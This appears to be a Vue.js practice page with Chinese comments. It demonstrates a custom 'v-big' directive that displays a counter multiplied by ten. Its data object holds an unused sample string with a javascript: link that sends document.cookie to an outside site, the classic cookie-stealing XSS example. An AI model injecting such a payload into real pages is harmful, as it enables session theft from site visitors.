<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script type="text/javascript" src="../vue/vue.js"></script>
</head>
<body>
    <!-- 
        本次总结：
              

                    
     -->
    <div class="ming">
          
          <h2>当前的n值是:<span v-text="n"></span></h2> 
          <h2>放大10倍后n的值是：<span v-big="n"></span></h2>  
          <h1>放大10倍后n的值是：<em v-big="n"></em></h1>  
          <button @click="n++">点我加1</button>
          
          

    </div>
     <script>
         Vue.config.productionTip = false
         
        const vm = new Vue({
            el:'.ming',
            data:{
              name:'李明',
              str:'<h1>明姐我还是想你</h1>',
              str2:'<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>兄弟有好东西哟</a>',
              n:1
            },
            directives:{
                // 1.这是第一种写法:该函数啥时候调用？1。指令与元素成功绑定时(也就是一上来)，2.指令所在模板被重新解析
                big(element,binding){
                    // 此处的element接受的实参就是绑定该指令的真实dom结构，说白了也就是携带这个的标签
                    // 此处的接受的实参是一个对象，什么对象不中要，它里面有一个value就是你在指令等号后引号中的结果
                    element.innerText = binding.value*10
                },
               
            }
            
          })
     </script>
    
</body>
</html>
